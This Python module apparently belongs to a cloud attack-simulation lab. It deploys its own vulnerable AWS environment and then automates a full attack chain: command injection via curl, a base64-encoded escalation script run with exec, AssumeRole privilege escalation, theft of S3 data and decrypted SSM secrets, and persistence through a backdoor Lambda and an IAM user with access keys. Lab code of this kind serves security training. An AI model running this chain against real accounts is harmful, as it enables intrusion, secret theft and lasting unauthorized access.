"""
COBRA Scenario 8: Vulnerable web app (command injection) -> EC2 RCE -> AssumeRole privilege escalation -> S3, SSM, Lambda -> persistence.
Two EC2s: web server (vulnerable app + IAM role with AssumeRole only), attacker (runs exploit via curl to web server).
"""
import base64
import json
import os
import subprocess
from time import sleep
from urllib.parse import quote

from termcolor import colored
from tqdm import tqdm

from core.helpers import generate_ssh_key, loading_animation


def scenario_8_destroy():
    """Delete exploit-created resources (Lambda, IAM user) then run Pulumi destroy."""
    out_path = "./core/cobra-scenario-8-output.json"
    region = "us-east-1"
    if os.path.exists(out_path):
        try:
            with open(out_path, "r") as f:
                data = json.load(f)
                region = data.get("Region", region)
        except (json.JSONDecodeError, KeyError):
            pass

    print(colored(
        "Deleting manually created resources (not tracked by Pulumi state)",
        color="red",
    ))
    loading_animation()
    print("-" * 30)

    deleted = []

    # Delete Lambda function created by exploit
    rc = subprocess.call(
        f"aws lambda delete-function --function-name cobra-s8-backdoor --region {region}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    if rc == 0:
        deleted.append("Lambda function: cobra-s8-backdoor")
    else:
        print(colored("  Lambda cobra-s8-backdoor: not found or already deleted", color="yellow"))

    # Delete IAM user and access keys created by exploit (same pattern as scenario 2)
    rc = subprocess.call(
        "aws iam list-access-keys --user-name cobra-s8-persist | jq -r '.AccessKeyMetadata[0].AccessKeyId' | xargs -I {} aws iam delete-access-key --user-name cobra-s8-persist --access-key-id {}",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    if rc == 0:
        deleted.append("IAM access key(s): cobra-s8-persist")

    rc = subprocess.call(
        "aws iam delete-user --user-name cobra-s8-persist",
        shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    if rc == 0:
        deleted.append("IAM user: cobra-s8-persist")
    else:
        print(colored("  IAM user cobra-s8-persist: not found or already deleted", color="yellow"))

    if deleted:
        print(colored("Resources deleted successfully:", color="green"))
        for item in deleted:
            print(colored(f"  - {item}", color="green"))
        print("-" * 30)

    print(colored("Running Pulumi destroy...", color="yellow"))
    subprocess.call(
        "cd ./scenarios/scenario_8/infra && pulumi destroy -s cobra-scenario-8 --yes",
        shell=True,
    )


def _run_via_attacker(attacker_ip, web_server_ip, cmd, key_path="./id_rsa"):
    """Run a command on the web server by SSH to attacker and curling the vulnerable app."""
    encoded = quote(cmd, safe="")
    url = f"http://{web_server_ip}:8000/?cmd={encoded}"
    ssh_cmd = (
        f'ssh -o StrictHostKeyChecking=accept-new -i {key_path} ubuntu@{attacker_ip} '
        f'"curl -s \\"{url}\\""'
    )
    try:
        out = subprocess.check_output(ssh_cmd, shell=True, timeout=60, text=True)
        return out.strip()
    except subprocess.CalledProcessError as e:
        return getattr(e, "output", str(e)) or ""
    except Exception as e:
        return str(e)


def scenario_8_execute(manual=False):
    print("-" * 30)
    print(colored(
        "Executing Scenario 8: Vulnerable web app (command injection) -> EC2 RCE -> AssumeRole privilege escalation -> S3, SSM, Lambda -> persistence",
        color="red",
    ))
    loading_animation()
    print("-" * 30)

    out_path = "./core/cobra-scenario-8-output.json"
    if os.path.exists(out_path):
        os.remove(out_path)
        print(f"File '{out_path}' found and deleted.")
    else:
        print(f"File '{out_path}' not found.")

    generate_ssh_key()

    # Check Pulumi CLI is available
    try:
        subprocess.run(["pulumi", "version"], capture_output=True, check=True, timeout=10)
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        print(colored("Pulumi CLI is not installed or not on PATH. Install from https://www.pulumi.com/docs/install/ and ensure 'pulumi' is in your PATH.", color="red"))
        raise SystemExit(1) from e

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    rc = subprocess.call(
        "cd ./scenarios/scenario_8/infra/ && pulumi up -s cobra-scenario-8 -y",
        shell=True,
    )
    if rc != 0:
        print(colored("Pulumi up failed. Check the output above. Ensure you are logged in (pulumi login) and have AWS credentials configured.", color="red"))
        raise SystemExit(1)
    subprocess.call(
        "cd ./scenarios/scenario_8/infra/ && pulumi stack -s cobra-scenario-8 output --json > ../../../core/cobra-scenario-8-output.json",
        shell=True,
    )

    if not os.path.exists(out_path):
        print(colored("Pulumi output file was not created. Run 'pulumi stack output --json' from scenarios/scenario_8/infra/ to debug.", color="red"))
        raise SystemExit(1)
    with open(out_path, "r") as f:
        raw = f.read().strip()
    if not raw:
        print(colored("Pulumi output file is empty. Ensure the stack deployed successfully.", color="red"))
        raise SystemExit(1)
    try:
        data = json.loads(raw)
    except json.JSONDecodeError as e:
        print(colored(f"Invalid JSON in output file: {e}. Check that 'pulumi stack output --json' runs correctly.", color="red"))
        raise SystemExit(1) from e

    web_server_ip = data["Web Server Public IP"]
    attacker_ip = data["Attacker Server Public IP"]
    bucket_name = data["Bucket Name"]
    bucket_key = data["Bucket Key"]
    ssm_name = data["SSM Parameter Name"]
    lambda_role_arn = data["Lambda Execution Role Arn"]
    elevated_role_arn = data["Elevated Role Arn"]
    region = data["Region"]

    sleep_duration = 100
    print(colored("Waiting for EC2 instances and vulnerable app to be ready...", color="yellow"))
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        while sleep_duration > 0:
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    if manual:
        print(colored("Lab ready. SSH to attacker and run exploit manually.", color="green"))
        print(colored(f"  ssh -i ./id_rsa ubuntu@{attacker_ip}", color="cyan"))
        print(colored(f"  curl \"http://{web_server_ip}:8000/?cmd=id\"", color="cyan"))
        return

    # --- Attack steps: RCE then AssumeRole -> S3, SSM, Lambda, IAM user (all with elevated role) ---
    print("-" * 30)
    print(colored("RCE check: run id on web server", color="red"))
    loading_animation()
    rce_out = _run_via_attacker(attacker_ip, web_server_ip, "id")
    print(colored(f"  Output: {rce_out[:200]}", color="green"))

    print("-" * 30)
    print(colored("AssumeRole (privilege escalation from web server EC2) -> S3, SSM, Lambda, IAM user", color="red"))
    loading_animation()
    escalation_script = f"""
import boto3, zipfile, io
role_arn = '{elevated_role_arn}'
bucket_name = '{bucket_name}'
bucket_key = '{bucket_key}'
ssm_name = '{ssm_name}'
lambda_role_arn = '{lambda_role_arn}'
region = '{region}'
sts = boto3.client('sts')
resp = sts.assume_role(RoleArn=role_arn, RoleSessionName='cobra-s8-escalation')
creds = resp['Credentials']
session = boto3.Session(
    aws_access_key_id=creds['AccessKeyId'],
    aws_secret_access_key=creds['SecretAccessKey'],
    aws_session_token=creds['SessionToken'],
)
print('AssumeRole: success')
s3 = session.client('s3')
buckets = s3.list_buckets()['Buckets']
print('Buckets:', [x['Name'] for x in buckets])
r = s3.get_object(Bucket=bucket_name, Key=bucket_key)
print('S3 content:', r['Body'].read().decode()[:200])
ssm = session.client('ssm', region_name=region)
p = ssm.get_parameter(Name=ssm_name, WithDecryption=True)
print('Secret:', p['Parameter']['Value'])
code = b'def handler(event, context): return {{"statusCode": 200}}'
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr('index.py', code.decode())
buf.seek(0)
session.client('lambda', region_name=region).create_function(
    FunctionName='cobra-s8-backdoor',
    Runtime='python3.11',
    Role=lambda_role_arn,
    Handler='index.handler',
    Code={{'ZipFile': buf.read()}}
)
print('Lambda created')
iam = session.client('iam')
try:
    iam.create_user(UserName='cobra-s8-persist')
except iam.exceptions.EntityAlreadyExistsException:
    pass
ak = iam.create_access_key(UserName='cobra-s8-persist')
print('IAM user created, KeyId:', ak['AccessKey']['AccessKeyId'])
"""
    esc_b64 = base64.b64encode(escalation_script.strip().encode()).decode()
    esc_cmd = f"python3 -c \"import base64; exec(base64.b64decode('{esc_b64}').decode())\""
    esc_out = _run_via_attacker(attacker_ip, web_server_ip, esc_cmd)
    for line in esc_out.split("\n"):
        if line.strip():
            print(colored(f"  {line.strip()[:300]}", color="green"))

    print("-" * 30)
    print(colored("Scenario 8 executed successfully!", color="green"))
